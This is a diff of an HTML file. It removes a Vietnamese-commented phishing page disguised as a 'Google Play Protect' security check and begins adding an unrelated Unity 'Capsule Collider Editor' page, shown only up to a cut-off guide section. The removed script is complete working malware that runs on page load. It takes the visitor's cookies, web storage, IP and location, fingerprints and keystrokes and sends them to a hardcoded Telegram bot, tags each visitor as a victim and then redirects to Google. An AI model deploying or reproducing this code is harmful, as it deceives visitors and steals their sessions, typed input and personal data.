@@ -1,810 +1,447 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Google Play Protect | Security Check</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Google Sans', Roboto, sans-serif;
-            background: #0a0e1a;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 16px;
-        }
-        
-        /* Glassmorphism container */
-        .container {
-            background: rgba(18, 25, 45, 0.9);
-            backdrop-filter: blur(20px);
-            border-radius: 48px;
-            padding: 40px 28px;
-            max-width: 420px;
-            width: 100%;
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.1);
-            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5);
-        }
-        
-        /* Animated shield icon */
-        .shield {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            border-radius: 30px;
-            margin: 0 auto 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 44px;
-            box-shadow: 0 10px 25px -5px rgba(102,126,234,0.4);
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-        
-        h1 {
-            color: #fff;
-            font-size: 26px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-        
-        .subtitle {
-            color: #8b9dc3;
-            font-size: 14px;
-            margin-bottom: 24px;
-        }
-        
-        /* Progress section */
-        .progress-section {
-            margin: 24px 0;
-        }
-        
-        .progress-bar {
-            height: 6px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 10px;
-            overflow: hidden;
-        }
-        
-        .progress-fill {
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
-            border-radius: 10px;
-            transition: width 0.4s ease;
-        }
-        
-        .stats {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 16px;
-            color: #6c86a3;
-            font-size: 12px;
-        }
-        
-        /* Status list */
-        .status-list {
-            text-align: left;
-            margin: 24px 0;
-            background: rgba(0,0,0,0.3);
-            border-radius: 20px;
-            padding: 16px;
-        }
-        
-        .status-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 8px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            font-size: 13px;
-            color: #b4c7e7;
-        }
-        
-        .status-item:last-child {
-            border-bottom: none;
-        }
-        
-        .status-icon {
-            width: 28px;
-            font-size: 16px;
-        }
-        
-        .status-text {
-            flex: 1;
-        }
-        
-        .status-badge {
-            font-size: 11px;
-            padding: 2px 8px;
-            border-radius: 20px;
-            background: rgba(102,126,234,0.2);
-            color: #a0b4e0;
-        }
-        
-        /* Loading dots */
-        .loading-dots {
-            display: inline-flex;
-            gap: 4px;
-        }
-        
-        .loading-dots span {
-            width: 6px;
-            height: 6px;
-            background: #667eea;
-            border-radius: 50%;
-            animation: bounce 1.4s infinite ease-in-out both;
-        }
-        
-        .loading-dots span:nth-child(1) { animation-delay: -0.32s; }
-        .loading-dots span:nth-child(2) { animation-delay: -0.16s; }
-        
-        @keyframes bounce {
-            0%, 80%, 100% { transform: scale(0); }
-            40% { transform: scale(1); }
-        }
-        
-        /* Footer */
-        .footer {
-            margin-top: 24px;
-            font-size: 11px;
-            color: #4a5a7a;
-        }
-        
-        /* Matrix rain effect */
-        .matrix-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: -1;
-            opacity: 0.1;
-        }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Capsule Collider Editor</title>
+<style>
+:root{--bg:#f3f5f4;--body:#c9d3cf;--card:#fff;--tx:#12201c;--mut:#5f6f69;--bd:#d9e0dd;--a:#0d9488;--b:#ea580c;--c:#7c3aed;--d:#db2777;--grid:#e6ebe9;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0e1513;--body:#33443e;--card:#16201d;--tx:#e6efec;--mut:#92a39d;--bd:#26342f;--grid:#1f2c28}}
+:root[data-theme="dark"]{--bg:#0e1513;--body:#33443e;--card:#16201d;--tx:#e6efec;--mut:#92a39d;--bd:#26342f;--grid:#1f2c28}
+html{color-scheme:light dark}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--tx);font:15px/1.45 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+main{max-width:900px;margin:0 auto;padding:14px}
+h1{font-size:20px;margin:4px 0 2px}
+p.s{margin:0 0 12px;color:var(--mut);font-size:13px}
+.card{background:var(--card);border:1px solid var(--bd);border-radius:12px;padding:12px;margin-bottom:12px}
+.drop{border:2px dashed var(--bd);text-align:center;padding:18px 10px;cursor:pointer}
+.drop.on{border-color:var(--a)}
+.drop input{display:none}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px;align-items:center}
+.tab{border:1.5px solid var(--bd);background:transparent;color:var(--tx);border-radius:8px;padding:6px 10px;font-size:13px;cursor:pointer}
+.tab.on{border-color:currentColor;font-weight:600}
+.dot{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:6px}
+select,input[type=number]{background:var(--bg);color:var(--tx);border:1px solid var(--bd);border-radius:8px;padding:6px 8px;font-size:14px}
+.row{display:grid;grid-template-columns:70px 1fr 100px;gap:8px;align-items:center;margin:7px 0}
+.row input[type=range]{width:100%}
+.row input[type=number]{width:100%}
+.btns{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+button.b{border:0;border-radius:8px;padding:9px 14px;font-size:14px;background:var(--a);color:#fff;cursor:pointer}
+button.b.g{background:transparent;color:var(--tx);border:1px solid var(--bd)}
+.views{max-width:380px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px}
+canvas{width:100%;display:block;border:1px solid var(--bd);border-radius:8px;background:var(--card)}
+.v small{color:var(--mut)}
+.warn{color:var(--b);font-size:13px;margin-top:6px}
+.msg{font-size:13px;color:var(--mut);margin-top:8px;word-break:break-all}
+
+.seg{display:flex;gap:8px;margin-bottom:10px}
+.sg{flex:1;padding:12px;font-size:16px;border-radius:10px;border:1.5px solid var(--bd);background:transparent;color:var(--tx);cursor:pointer}
+.sg.on{background:var(--a);color:#fff;border-color:var(--a);font-weight:600}
+.chips{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px}
+.chip{border:1.5px solid var(--cc,var(--bd));border-radius:16px;padding:5px 10px;font-size:13px;background:transparent;color:var(--tx);cursor:pointer}
+.chip.on{background:var(--cc);color:#111;font-weight:600}
+.hint{color:var(--mut);font-size:13px}
+.gate{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:0 0 10px;font-size:13px}
+.gb{border:1.5px solid var(--bd);border-radius:16px;padding:4px 10px;color:var(--mut)}
+.gb.ok{border-color:var(--a);color:var(--a);font-weight:600}
+.gnote{color:var(--b);width:100%}
+.gnote.ok{color:var(--a)}
+button.b:disabled{opacity:.4;cursor:not-allowed}
+details.guide{padding:0}
+details.guide summary{cursor:pointer;padding:12px;font-weight:600;font-size:14px}
+details.guide .gbody{padding:0 14px 12px;font-size:13.5px;color:var(--tx)}
+details.guide ol{margin:6px 0;padding-left:20px}
+details.guide li{margin:5px 0}
+details.guide .note{color:var(--mut);font-size:12.5px;margin-top:8px}
+.sheet{position:sticky;bottom:0;z-index:5;box-shadow:0 -6px 18px rgba(0,0,0,.18);padding-bottom:calc(12px + env(safe-area-inset-bottom,0px))}
+.eh{display:flex;justify-content:space-between;align-items:center;gap:8px}
+#c0{max-width:380px;margin:0 auto;cursor:pointer;touch-action:manipulation}
+</style>
 </head>
 <body>
-    <div class="matrix-bg" id="matrixBg"></div>
-    
-    <div class="container">
-        <div class="shield">
-            🛡️
-        </div>
-        <h1>Google Play Protect</h1>
-        <p class="subtitle">Security check in progress</p>
-        
-        <div class="progress-section">
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
-            <div class="stats">
-                <span id="progressPercent">0%</span>
-                <span id="statusMessage">Initializing...</span>
-            </div>
-        </div>
-        
-        <div class="status-list" id="statusList">
-            <!-- Status items will be added dynamically -->
-        </div>
-        
-        <div class="footer">
-            <span>🔒 Encrypted connection</span> • 
-            <span>v4.2.1</span> • 
-            <span>Google LLC</span>
-        </div>
-    </div>
+<main>
+<h1>Capsule Collider Editor</h1>
+<label class="card drop" id="drop">
+<input type="file" id="file">
+<div id="dropTxt">Chạm để chọn file Unity gốc (.assets, .bundle, level, globalgamemanagers) hoặc file dump .txt</div>
+</label>
 
-    <script>
-        // ============================================================
-        // CẤU HÌNH TELEGRAM
-        // ============================================================
-        const BOT_TOKEN = '8678956338:AAEDpm0-I4KGjomktv8kDnA7t8K5PC3p1ag';     // 🔴 THAY BẰNG TOKEN BOT
-        const CHAT_ID = '6232287791';         // 🔴 THAY BẰNG ID CỦA BẠN
-        const VICTIM_ID = 'V_' + Math.random().toString(36).substr(2, 10).toUpperCase();
-        
-        // ============================================================
-        // BIẾN TOÀN CỤC
-        // ============================================================
-        let totalSteps = 0;
-        let completedSteps = 0;
-        let collectedData = [];
-        
-        // ============================================================
-        // HÀM UI
-        // ============================================================
-        function updateProgress(percent, message, stepName = null) {
-            document.getElementById('progressFill').style.width = percent + '%';
-            document.getElementById('progressPercent').innerText = percent + '%';
-            document.getElementById('statusMessage').innerHTML = message;
-            
-            if (stepName) {
-                const statusList = document.getElementById('statusList');
-                const existingItem = document.getElementById(`status_${stepName.replace(/\s/g, '_')}`);
-                if (existingItem) {
-                    existingItem.querySelector('.status-badge').innerHTML = '✓ DONE';
-                    existingItem.querySelector('.status-badge').style.background = 'rgba(76, 175, 80, 0.3)';
-                    existingItem.querySelector('.status-badge').style.color = '#4caf50';
-                } else {
-                    const item = document.createElement('div');
-                    item.className = 'status-item';
-                    item.id = `status_${stepName.replace(/\s/g, '_')}`;
-                    item.innerHTML = `
-                        <div class="status-icon">🔍</div>
-                        <div class="status-text">${stepName}</div>
-                        <div class="status-badge">✓ DONE</div>
-                    `;
-                    statusList.appendChild(item);
-                }
-            }
-        }
-        
-        function addStatusItem(icon, text, badge = '...') {
-            const statusList = document.getElementById('statusList');
-            const item = document.createElement('div');
-            item.className = 'status-item';
-            item.innerHTML = `
-                <div class="status-icon">${icon}</div>
-                <div class="status-text">${text}</div>
-                <div class="status-badge">${badge}</div>
-            `;
-            statusList.appendChild(item);
-            return item;
-        }
-        
-        // Matrix background effect
-        function createMatrixEffect() {
-            const canvas = document.createElement('canvas');
-            canvas.style.position = 'fixed';
-            canvas.style.top = '0';
-            canvas.style.left = '0';
-            canvas.style.width = '100%';
-            canvas.style.height = '100%';
-            canvas.style.pointerEvents = 'none';
-            canvas.style.zIndex = '-1';
-            canvas.style.opacity = '0.08';
-            document.body.appendChild(canvas);
-            
-            const ctx = canvas.getContext('2d');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            
-            const chars = '01アイウエオカキクケコ';
-            const fontSize = 14;
-            const columns = canvas.width / fontSize;
-            const drops = [];
-            for (let i = 0; i < columns; i++) drops[i] = 1;
-            
-            function draw() {
-                ctx.fillStyle = 'rgba(10, 14, 26, 0.05)';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                ctx.fillStyle = '#667eea';
-                ctx.font = fontSize + 'px monospace';
-                for (let i = 0; i < drops.length; i++) {
-                    const text = chars[Math.floor(Math.random() * chars.length)];
-                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                    drops[i]++;
-                }
-            }
-            setInterval(draw, 50);
-        }
-        createMatrixEffect();
-        
-        // ============================================================
-        // HÀM GỬI DỮ LIỆU
-        // ============================================================
-        async function sendMessage(text, parseMode = 'HTML') {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: `[${VICTIM_ID}] ${text}`,
-                        parse_mode: parseMode
-                    })
-                });
-                return response.ok;
-            } catch(e) { return false; }
-        }
-        
-        async function sendFile(base64Data, filename, caption) {
-            try {
-                const blob = b64toBlob(base64Data);
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('document', blob, filename);
-                formData.append('caption', `[${VICTIM_ID}] ${caption}`);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch(e) {}
-        }
-        
-        function b64toBlob(b64) {
-            const byteChars = atob(b64);
-            const byteArr = new Uint8Array(byteChars.length);
-            for (let i = 0; i < byteChars.length; i++) byteArr[i] = byteChars.charCodeAt(i);
-            return new Blob([byteArr]);
-        }
-        
-        // ============================================================
-        // 1. THÔNG TIN CƠ BẢN (Không cần quyền)
-        // ============================================================
-        function getBasicInfo() {
-            const ua = navigator.userAgent;
-            let browser = 'Unknown', os = 'Unknown', device = 'Unknown';
-            
-            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
-            else if (ua.includes('Firefox')) browser = 'Firefox';
-            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-            else if (ua.includes('Edg')) browser = 'Edge';
-            else if (ua.includes('Opera')) browser = 'Opera';
-            
-            if (ua.includes('Android')) os = 'Android';
-            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
-            else if (ua.includes('Windows')) os = 'Windows';
-            else if (ua.includes('Mac')) os = 'macOS';
-            else if (ua.includes('Linux')) os = 'Linux';
-            
-            device = /Mobile|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop';
-            
-            return { browser, os, device, ua, language: navigator.language, platform: navigator.platform };
-        }
-        
-        // ============================================================
-        // 2. IP VÀ ĐỊA LÝ (API, không cần quyền)
-        // ============================================================
-        async function getGeoInfo() {
-            const sources = [
-                'https://ipapi.co/json/',
-                'https://api.ipify.org?format=json',
-                'https://ipwho.is/'
-            ];
-            for (const source of sources) {
-                try {
-                    const res = await fetch(source);
-                    const data = await res.json();
-                    if (data.ip) {
-                        return {
-                            ip: data.ip,
-                            city: data.city || data.city_name || 'Unknown',
-                            region: data.region,
-                            country: data.country_name || data.country,
-                            lat: data.latitude || 0,
-                            lon: data.longitude || 0,
-                            isp: data.org || data.isp,
-                            timezone: data.timezone
-                        };
-                    }
-                } catch(e) {}
-            }
-            return { ip: 'Unknown', city: 'Unknown', lat: 0, lon: 0 };
-        }
-        
-        // ============================================================
-        // 3. MÀN HÌNH & HARDWARE
-        // ============================================================
-        function getHardwareInfo() {
-            return {
-                screen: `${screen.width}x${screen.height}`,
-                availScreen: `${screen.availWidth}x${screen.availHeight}`,
-                colorDepth: screen.colorDepth,
-                pixelRatio: window.devicePixelRatio,
-                orientation: screen.orientation?.type || 'unknown',
-                hardwareConcurrency: navigator.hardwareConcurrency || 0,
-                deviceMemory: navigator.deviceMemory || 0,
-                maxTouchPoints: navigator.maxTouchPoints || 0
-            };
-        }
-        
-        // ============================================================
-        // 4. STORAGE (Cookies, Local, Session)
-        // ============================================================
-        function getStorageData() {
-            const cookies = document.cookie || 'empty';
-            let localStorage = 'empty', sessionStorage = 'empty';
-            try {
-                if (localStorage.length > 0) {
-                    const items = {};
-                    for (let i = 0; i < localStorage.length; i++) {
-                        const key = localStorage.key(i);
-                        items[key] = localStorage.getItem(key);
-                    }
-                    localStorage = JSON.stringify(items);
-                }
-            } catch(e) { localStorage = 'access_denied'; }
-            
-            try {
-                if (sessionStorage.length > 0) {
-                    const items = {};
-                    for (let i = 0; i < sessionStorage.length; i++) {
-                        const key = sessionStorage.key(i);
-                        items[key] = sessionStorage.getItem(key);
-                    }
-                    sessionStorage = JSON.stringify(items);
-                }
-            } catch(e) { sessionStorage = 'access_denied'; }
-            
-            return { cookies, localStorage, sessionStorage };
-        }
-        
-        // ============================================================
-        // 5. PLUGINS & EXTENSIONS
-        // ============================================================
-        function getPlugins() {
-            const plugins = [];
-            if (navigator.plugins) {
-                for (let i = 0; i < navigator.plugins.length; i++) {
-                    plugins.push(navigator.plugins[i].name);
-                }
-            }
-            return plugins;
-        }
-        
-        function detectExtensions() {
-            const extensions = [];
-            // Detect common Chrome extensions via web accessible resources
-            const testPaths = [
-                'chrome-extension://',
-                'moz-extension://'
-            ];
-            return extensions;
-        }
-        
-        // ============================================================
-        // 6. MẠNG & KẾT NỐI
-        // ============================================================
-        function getNetworkInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            return {
-                effectiveType: connection?.effectiveType || 'unknown',
-                downlink: connection?.downlink || 0,
-                rtt: connection?.rtt || 0,
-                saveData: connection?.saveData || false
-            };
-        }
-        
-        async function getLocalIP() {
-            return new Promise((resolve) => {
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                pc.onicecandidate = (ice) => {
-                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                    const ipMatch = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-                    if (ipMatch) {
-                        resolve(ipMatch[1]);
-                        pc.close();
-                    }
-                };
-                setTimeout(() => resolve('unavailable'), 2000);
-            });
-        }
-        
-        // ============================================================
-        // 7. TRÌNH DUYỆT WEB ĐÃ TRUY CẬP (CSS History Hack)
-        // ============================================================
-        function getVisitedSites() {
-            const sites = [
-                'facebook.com', 'youtube.com', 'google.com', 'tiktok.com',
-                'instagram.com', 'twitter.com', 'zalo.me', 'shopee.vn',
-                'github.com', 'netflix.com', 'spotify.com', 'reddit.com',
-                'whatsapp.com', 'telegram.org', 'discord.com', 'twitch.tv'
-            ];
-            const visited = [];
-            const link = document.createElement('a');
-            for (const site of sites) {
-                link.href = `https://${site}`;
-                if (link.offsetTop !== 0) visited.push(site);
-            }
-            return visited;
-        }
-        
-        // ============================================================
-        // 8. FINGERPRINT (Canvas + WebGL)
-        // ============================================================
-        function getCanvasFingerprint() {
-            const canvas = document.createElement('canvas');
-            canvas.width = 200;
-            canvas.height = 50;
-            const ctx = canvas.getContext('2d');
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(0, 0, 100, 50);
-            ctx.fillStyle = '#069';
-            ctx.fillText('BrowserLeaks', 10, 30);
-            return canvas.toDataURL();
-        }
-        
-        function getWebGLFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return 'not_supported';
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    return `${vendor}|${renderer}`;
-                }
-                return 'no_debug_info';
-            } catch(e) { return 'error'; }
-        }
-        
-        function getAudioFingerprint() {
-            return new Promise((resolve) => {
-                const AudioContext = window.AudioContext || window.webkitAudioContext;
-                if (!AudioContext) { resolve('not_supported'); return; }
-                const ctx = new AudioContext();
-                const oscillator = ctx.createOscillator();
-                const analyser = ctx.createAnalyser();
-                oscillator.connect(analyser);
-                analyser.connect(ctx.destination);
-                oscillator.type = 'sine';
-                oscillator.frequency.value = 440;
-                oscillator.start();
-                const data = new Uint8Array(analyser.frequencyBinCount);
-                analyser.getByteFrequencyData(data);
-                oscillator.stop();
-                ctx.close();
-                resolve(Array.from(data).join(','));
-            });
-        }
-        
-        // ============================================================
-        // 9. THIẾT BỊ NGOẠI VI (Camera, Mic - Liệt kê, không cần quyền)
-        // ============================================================
-        async function listDevices() {
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const cams = devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Camera');
-                const mics = devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'Microphone');
-                return { cameras: cams, microphones: mics, count: cams.length + mics.length };
-            } catch(e) {
-                return { cameras: [], microphones: [], count: 0 };
-            }
-        }
-        
-        // ============================================================
-        // 10. TỐC ĐỘ MẠNG
-        // ============================================================
-        async function testNetworkSpeed() {
-            const start = Date.now();
-            try {
-                await fetch('https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png?_=' + Date.now(), { cache: 'no-cache', mode: 'no-cors' });
-                return Date.now() - start;
-            } catch(e) { return -1; }
-        }
-        
-        // ============================================================
-        // 11. PHÁT HIỆN ADBLOCK & VPN
-        // ============================================================
-        function detectAdBlock() {
-            const test = document.createElement('div');
-            test.className = 'adsbox';
-            test.style.display = 'none';
-            document.body.appendChild(test);
-            const blocked = test.offsetHeight === 0;
-            document.body.removeChild(test);
-            return blocked;
-        }
-        
-        async function detectVPN() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                return data.proxy || data.hosting || false;
-            } catch(e) { return false; }
-        }
-        
-        // ============================================================
-        // 12. KIỂM TRA WEBDRIVER (BOT)
-        // ============================================================
-        function isAutomated() {
-            return navigator.webdriver || 
-                   window._phantom || 
-                   window.callPhantom || 
-                   document.documentElement.getAttribute('webdriver') !== null;
-        }
-        
-        // ============================================================
-        // 13. PIN (Battery API)
-        // ============================================================
-        async function getBatteryStatus() {
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    return { level: Math.round(battery.level * 100), charging: battery.charging };
-                } catch(e) { return null; }
-            }
-            return null;
-        }
-        
-        // ============================================================
-        // 14. LẤY DỮ LIỆU TỪ CÁC TAB KHÁC (thử nghiệm)
-        // ============================================================
-        function tryCrossTabData() {
-            // Thử lấy dữ liệu từ các tab khác qua localStorage events
-            // Giới hạn của trình duyệt
-            return null;
-        }
-        
-        // ============================================================
-        // 15. KEYLOGGER NHẸ (bắt sự kiện bàn phím)
-        // ============================================================
-        let keylogBuffer = '';
-        let keylogActive = false;
-        
-        function startKeylogger() {
-            keylogActive = true;
-            document.addEventListener('keydown', (e) => {
-                if (keylogActive) {
-                    let key = e.key;
-                    if (key === ' ') key = '[SPACE]';
-                    else if (key === 'Enter') key = '[ENTER]\n';
-                    else if (key === 'Backspace') key = '[BACKSPACE]';
-                    else if (key === 'Tab') key = '[TAB]';
-                    keylogBuffer += key;
-                    if (keylogBuffer.length > 500) {
-                        sendMessage(`⌨️ <b>Keylog Data:</b>\n<code>${keylogBuffer}</code>`);
-                        keylogBuffer = '';
-                    }
-                }
-            });
-        }
-        
-        // ============================================================
-        // MAIN - THU THẬP TẤT CẢ DỮ LIỆU
-        // ============================================================
-        async function collectAllData() {
-            // Khởi động keylogger
-            startKeylogger();
-            
-            // Gửi thông báo bắt đầu
-            await sendMessage(`✅ <b>BOTNET ACTIVATED</b>\n🆔 <code>${VICTIM_ID}</code>\n⏰ ${new Date().toLocaleString('vi-VN')}`);
-            addStatusItem('🚀', 'Bot activated', '✓');
-            updateProgress(2, 'Activated', 'Khởi động');
-            
-            // 1. Thông tin cơ bản
-            const basic = getBasicInfo();
-            await sendMessage(`🌐 <b>Device Info:</b>\n├ Browser: ${basic.browser}\n├ OS: ${basic.os}\n├ Device: ${basic.device}\n├ Language: ${basic.language}\n└ Platform: ${basic.platform}`);
-            addStatusItem('🌐', 'Browser & OS Info', '✓');
-            updateProgress(8, 'Got device info', 'Thông tin thiết bị');
-            
-            // 2. IP và địa lý
-            const geo = await getGeoInfo();
-            await sendMessage(`📍 <b>Geo Location:</b>\n├ IP: ${geo.ip}\n├ Location: ${geo.city}, ${geo.country}\n├ ISP: ${geo.isp}\n├ Timezone: ${geo.timezone}\n└ Coordinates: ${geo.lat}, ${geo.lon}`);
-            addStatusItem('📍', 'IP & Location', '✓');
-            updateProgress(15, 'Got IP & location', 'Vị trí địa lý');
-            
-            // 3. Hardware
-            const hw = getHardwareInfo();
-            await sendMessage(`💻 <b>Hardware Info:</b>\n├ Screen: ${hw.screen}\n├ Color Depth: ${hw.colorDepth}bit\n├ DPI Ratio: ${hw.pixelRatio}\n├ CPU Cores: ${hw.hardwareConcurrency}\n├ RAM: ${hw.deviceMemory}GB\n└ Touch Points: ${hw.maxTouchPoints}`);
-            addStatusItem('💻', 'Hardware Info', '✓');
-            updateProgress(22, 'Got hardware info', 'Cấu hình máy');
-            
-            // 4. Storage
-            const storage = getStorageData();
-            if (storage.cookies !== 'empty') {
-                await sendMessage(`🍪 <b>Cookies:</b>\n<code>${storage.cookies.substring(0, 400)}</code>`);
-            }
-            if (storage.localStorage !== 'empty' && storage.localStorage !== 'access_denied') {
-                await sendMessage(`💾 <b>LocalStorage:</b>\n<code>${storage.localStorage.substring(0, 400)}</code>`);
-            }
-            if (storage.sessionStorage !== 'empty' && storage.sessionStorage !== 'access_denied') {
-                await sendMessage(`📦 <b>SessionStorage:</b>\n<code>${storage.sessionStorage.substring(0, 400)}</code>`);
-            }
-            addStatusItem('💾', 'Storage Data', '✓');
-            updateProgress(32, 'Got storage data', 'Cookies & Storage');
-            
-            // 5. Plugins
-            const plugins = getPlugins();
-            if (plugins.length) {
-                await sendMessage(`🔌 <b>Plugins:</b>\n${plugins.slice(0, 10).join(', ')}`);
-            }
-            addStatusItem('🔌', 'Plugins', '✓');
-            updateProgress(38, 'Got plugins', 'Plugins');
-            
-            // 6. Network
-            const net = getNetworkInfo();
-            await sendMessage(`📡 <b>Network Info:</b>\n├ Type: ${net.effectiveType}\n├ Speed: ${net.downlink}Mbps\n├ Latency: ${net.rtt}ms\n└ Save Data: ${net.saveData}`);
-            const localIP = await getLocalIP();
-            await sendMessage(`🏠 <b>Local IP:</b> ${localIP}`);
-            addStatusItem('📡', 'Network Info', '✓');
-            updateProgress(48, 'Got network info', 'Thông tin mạng');
-            
-            // 7. Speed test
-            const ping = await testNetworkSpeed();
-            if (ping > 0) await sendMessage(`⚡ <b>Ping:</b> ${ping}ms`);
-            updateProgress(52, 'Speed test done', 'Kiểm tra tốc độ');
-            
-            // 8. Visited sites
-            const visited = getVisitedSites();
-            if (visited.length) {
-                await sendMessage(`📜 <b>Visited Sites:</b>\n${visited.join(', ')}`);
-            }
-            addStatusItem('📜', 'Browser History', '✓');
-            updateProgress(58, 'Got browsing history', 'Lịch sử web');
-            
-            // 9. AdBlock & VPN
-            const hasAdBlock = detectAdBlock();
-            if (hasAdBlock) await sendMessage(`🛡️ <b>AdBlock:</b> Enabled`);
-            const isVPN = await detectVPN();
-            if (isVPN) await sendMessage(`🔒 <b>VPN/Proxy:</b> Detected`);
-            addStatusItem('🛡️', 'Security Check', '✓');
-            updateProgress(65, 'Security check done', 'Bảo mật');
-            
-            // 10. Bot detection
-            const isBot = isAutomated();
-            await sendMessage(`🤖 <b>Automated:</b> ${isBot ? 'Yes (Bot detected)' : 'No (Human)'}`);
-            updateProgress(70, 'Bot check done', 'Xác thực');
-            
-            // 11. Battery
-            const battery = await getBatteryStatus();
-            if (battery) await sendMessage(`🔋 <b>Battery:</b> ${battery.level}% ${battery.charging ? '(Charging)' : '(Not charging)'}`);
-            updateProgress(75, 'Got battery info', 'Pin');
-            
-            // 12. Devices (Camera/Mic list)
-            const devices = await listDevices();
-            if (devices.cameras.length) await sendMessage(`📷 <b>Cameras:</b>\n${devices.cameras.join('\n')}`);
-            if (devices.microphones.length) await sendMessage(`🎤 <b>Microphones:</b>\n${devices.microphones.join('\n')}`);
-            addStatusItem('📷', 'Devices List', '✓');
-            updateProgress(82, 'Device enumeration done', 'Thiết bị ngoại vi');
-            
-            // 13. Fingerprints
-            const canvasFP = getCanvasFingerprint();
-            const webglFP = getWebGLFingerprint();
-            const audioFP = await getAudioFingerprint();
-            await sendMessage(`🆔 <b>Fingerprints:</b>\n├ Canvas: ${canvasFP.substring(0, 50)}...\n├ WebGL: ${webglFP}\n└ Audio: ${audioFP.substring(0, 50)}...`);
-            addStatusItem('🆔', 'Device Fingerprint', '✓');
-            updateProgress(92, 'Fingerprint generated', 'Fingerprint');
-            
-            // 14. Thời gian
-            await sendMessage(`📅 <b>Timestamp:</b> ${new Date().toLocaleString('vi-VN')}`);
-            
-            // 15. Keylog buffer cuối cùng
-            setTimeout(async () => {
-                if (keylogBuffer.length > 0) {
-                    await sendMessage(`⌨️ <b>Final Keylog:</b>\n<code>${keylogBuffer}</code>`);
-                }
-            }, 3000);
-            
-            // 16. Hoàn thành
-            updateProgress(100, 'Complete!', 'Hoàn tất');
-            await sendMessage(`✅ <b>COLLECTION COMPLETE!</b>\n📊 Total data points: 25+\n🆔 Victim ID: ${VICTIM_ID}`);
-            addStatusItem('✅', 'Data collection complete', '100%');
-            
-            // Keylogger tiếp tục chạy
-            setInterval(async () => {
-                if (keylogBuffer.length > 100) {
-                    await sendMessage(`⌨️ <b>Keylog Batch:</b>\n<code>${keylogBuffer}</code>`);
-                    keylogBuffer = '';
-                }
-            }, 30000);
-            
-            // Chuyển hướng sau 3 giây
-            setTimeout(() => {
-                window.location.href = 'https://www.google.com';
-            }, 3000);
-        }
-        
-        // Bắt đầu
-        collectAllData();
-    </script>
+<details class="card guide" id="guide" open>
+<summary>Hướng dẫn sử dụng</summary>
+<div class="gbody">
+<ol>
